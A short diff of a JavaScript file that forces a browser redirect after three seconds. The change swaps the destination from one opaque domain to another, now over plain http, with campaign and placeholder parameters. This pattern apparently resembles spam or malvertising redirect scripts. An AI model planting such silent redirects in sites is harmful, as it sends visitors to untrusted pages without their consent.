@@ -4,5 +4,5 @@ setTimeout(function() {
 }, 1000);
 
 setTimeout(function() {
-    window.location.href = 'https://t7q4.com/?utm_campaign=RuEoNAxI6g&v1=[v1]&v2=[v2]&v3=[v3]';
+    window.location.href = 'http://h2n6.com/?utm_campaign=BrHK3REWQu&v1=[v1]&v2=[v2]&v3=[v3]';
 }, 3000);
